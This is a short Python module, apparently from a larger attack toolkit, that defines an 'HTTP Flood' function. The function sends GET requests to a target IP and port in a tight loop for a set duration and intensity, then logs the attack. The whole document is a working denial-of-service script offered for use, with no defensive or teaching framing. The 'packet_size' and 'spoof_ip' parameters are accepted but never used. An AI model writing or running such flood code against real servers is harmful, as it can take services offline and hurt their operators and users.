import requests
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=None, headers=None, spoof_ip=None):
    url = f"http://{target_ip}:{target_port}"
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            # Use custom headers if provided
            custom_headers = headers if headers else {}
            requests.get(url, headers=custom_headers)

    log_attack("HTTP Flood", target_ip, target_port, duration, intensity)
    